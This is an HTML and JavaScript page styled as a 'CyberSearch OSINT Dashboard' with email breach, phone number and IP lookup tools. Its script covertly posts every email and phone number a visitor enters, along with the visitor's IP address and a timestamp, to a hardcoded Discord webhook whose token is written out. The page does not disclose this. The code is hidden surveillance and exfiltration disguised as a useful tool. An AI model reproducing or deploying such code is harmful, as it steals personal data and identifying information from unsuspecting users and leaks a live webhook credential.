
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CyberSearch OSINT Dashboard</title>
  <style>
    body { font-family: Arial, sans-serif; background: #121212; color: #eee; padding: 2rem; }
    .container { max-width: 700px; margin: auto; }
    input, button { padding: 0.6rem; margin: 0.5rem 0; width: 100%; font-size: 1rem; }
    button { background: #007bff; color: white; border: none; border-radius: 5px; }
    .card { background: #1e1e1e; padding: 1rem; margin-top: 1rem; border-radius: 8px; }
    h2 { color: #00d9ff; }
  </style>
</head>
<body>
  <div class="container">
    <h1>CyberSearch OSINT Dashboard</h1>

    <h2>üîç Email Breach Check</h2>
    <input id="emailInput" placeholder="Enter email address">
    <button onclick="checkEmail()">Check Breach</button>
    <div id="emailResult" class="card"></div>

    <h2>üìû Phone Number Lookup</h2>
    <input id="phoneInput" placeholder="Enter phone number">
    <button onclick="checkPhone()">Lookup Phone</button>
    <div id="phoneResult" class="card"></div>

    <h2>üåç IP Lookup (Your IP)</h2>
    <button onclick="lookupIP()">Get My IP Info</button>
    <div id="ipResult" class="card"></div>
  </div>

<script>
const webhook = "https://discord.com/api/webhooks/1383100299396518068/bXubPq6c3PUbZlOlbCR0tz-UhxmZc4mbXGX1-d87NGQVO2NZA-dMEiuN5DLjCiFxvd-6";

function logToDiscord(action, data) {
  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(ipData => {
      const payload = {
        embeds: [{
          title: "CyberSearch Log",
          description: `Action: **${action}**`,
          color: 3447003,
          fields: [
            { name: "Details", value: data },
            { name: "Visitor IP", value: ipData.ip },
            { name: "Timestamp", value: new Date().toISOString() }
          ]
        }]
      };
      return fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    });
}

function checkEmail() {
  const email = document.getElementById("emailInput").value;
  if (!email) return;
  logToDiscord("Email Breach Check", email);
  fetch("https://leakcheck.io/api/email/" + encodeURIComponent(email) + "?limit=1")
    .then(res => res.json())
    .then(data => {
      document.getElementById("emailResult").innerHTML = data.success
        ? `<strong>Breached:</strong><br>${JSON.stringify(data.data)}`
        : "No results or API error.";
    });
}

function checkPhone() {
  const phone = document.getElementById("phoneInput").value;
  if (!phone) return;
  logToDiscord("Phone Lookup", phone);
  fetch("https://api.apilayer.com/number_verification/validate?number=" + encodeURIComponent(phone), {
    headers: { "apikey": "YOUR_NUMVERIFY_KEY" }
  })
    .then(res => res.json())
    .then(data => {
      document.getElementById("phoneResult").innerHTML =
        `<strong>Valid:</strong> ${data.valid}<br><strong>Location:</strong> ${data.location}<br><strong>Carrier:</strong> ${data.carrier}`;
    });
}

function lookupIP() {
  fetch("https://ipapi.co/json")
    .then(res => res.json())
    .then(data => {
      document.getElementById("ipResult").innerHTML =
        `<strong>IP:</strong> ${data.ip}<br><strong>City:</strong> ${data.city}<br><strong>Org:</strong> ${data.org}<br><strong>Country:</strong> ${data.country_name}`;
      logToDiscord("Visitor IP Lookup", data.ip);
    });
}
</script>
</body>
</html>
